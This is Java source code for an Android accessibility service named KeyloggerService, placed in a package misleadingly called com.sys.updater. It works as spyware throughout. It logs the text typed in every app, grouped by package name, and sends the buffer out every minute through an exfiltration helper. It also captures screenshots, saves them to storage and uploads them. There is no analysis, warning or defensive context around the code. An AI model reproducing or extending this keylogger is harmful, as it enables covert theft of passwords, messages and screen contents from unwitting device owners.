package com.sys.updater;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityService.ScreenshotResult;
import android.accessibilityservice.AccessibilityService.TakeScreenshotCallback;
import android.graphics.Bitmap;
import android.hardware.HardwareBuffer;
import android.os.Build;
import android.view.Display;
import android.view.accessibility.AccessibilityEvent;
import java.io.File;
import java.io.FileOutputStream;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

public class KeyloggerService extends AccessibilityService {
    
    public static KeyloggerService instance = null;
    
    private String currentPackage = "";
    private StringBuilder buffer = new StringBuilder();
    private Timer flushTimer;

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        instance = this;
        
        flushTimer = new Timer();
        flushTimer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                flushBuffer();
            }
        }, 60000, 60000);
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;
        
        String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "unknown";
        
        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            if (!pkg.equals(currentPackage) && !pkg.equals("com.android.systemui")) {
                flushBuffer();
                currentPackage = pkg;
                buffer.append("\n\n=== [").append(pkg).append("] ===\n");
            }
        }

        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            List<CharSequence> text = event.getText();
            if (text != null && !text.isEmpty()) {
                buffer.append("> ").append(text.get(0).toString()).append("\n");
            }
        }
    }

    private synchronized void flushBuffer() {
        if (buffer.length() > 0) {
            String data = buffer.toString();
            if (data.length() > 4000) {
                data = data.substring(data.length() - 4000);
            }
            Exfil.send("KEYLOG:\n" + data);
            buffer.setLength(0);
        }
    }

    public void captureScreen() {
        Exfil.send("Screen API: Requesting...");
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            takeScreenshot(Display.DEFAULT_DISPLAY, getMainExecutor(), new TakeScreenshotCallback() {
                @Override
                public void onSuccess(ScreenshotResult screenshotResult) {
                    Exfil.send("Screen API: Success, extracting Bitmap...");
                    try {
                        HardwareBuffer buffer = screenshotResult.getHardwareBuffer();
                        Bitmap bitmap = Bitmap.wrapHardwareBuffer(buffer, screenshotResult.getColorSpace());
                        
                        if (bitmap == null) {
                            Exfil.send("❌ Bitmap is NULL (Hardware buffer issue)");
                            buffer.close();
                            return;
                        }
                        
                        File file = new File(getExternalFilesDir(null), "screenshot.jpg");
                        FileOutputStream fos = new FileOutputStream(file);
                        bitmap.compress(Bitmap.CompressFormat.JPEG, 90, fos);
                        fos.close();
                        buffer.close();
                        
                        Exfil.send("Screen API: File saved, uploading...");
                        Exfil.sendFile(file.getAbsolutePath(), "Photo", "Screen Capture");
                    } catch (Exception e) {
                        Exfil.send("❌ Screenshot Ex: " + e.getMessage());
                    }
                }

                @Override
                public void onFailure(int errorCode) {
                    Exfil.send("❌ Screen API Failed. Error code: " + errorCode);
                }
            });
        } else {
            Exfil.send("❌ Android version too old for Accessibility Screenshot.");
        }
    }

    @Override
    public void onInterrupt() { instance = null; }
    
    @Override
    public void onDestroy() { instance = null; super.onDestroy(); }
}
